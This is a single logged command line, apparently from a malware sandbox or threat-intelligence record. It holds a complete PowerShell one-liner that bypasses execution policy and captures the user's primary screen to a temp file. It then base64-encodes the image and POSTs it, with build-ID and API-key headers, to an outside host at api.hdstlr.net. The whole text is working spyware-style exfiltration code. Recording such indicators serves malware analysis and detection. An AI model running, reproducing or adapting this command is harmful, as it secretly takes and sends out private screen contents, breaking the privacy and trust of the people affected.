commandlines: powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference = 'Stop'; try { Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen(0,0,0,0,$screen.Size); $bitmap.Save('C:\Users\Admin\AppData\Local\Temp\sys_win_*.png'); $graphics.Dispose(); $bitmap.Dispose(); $fileBytes = [System.IO.File]::ReadAllBytes('C:\Users\Admin\AppData\Local\Temp\sys_win_*.png'); $base64Image = [System.Convert]::ToBase64String($fileBytes); $headers = @{ 'X-Build-ID' = '*'; 'X-Api-KEY' = '*'; 'Content-Type' = 'application/json' }; $bodyObj = @{ image = $base64Image; buildId = '*' }; $jsonBody = $bodyObj | ConvertTo-Json -Compress; Invoke-RestMethod -Uri 'https://api.hdstlr.net/capture' -Method Post -Headers $headers -Body $jsonBody; } catch { Write-Error $_.Exception.Message; exit 1; }"
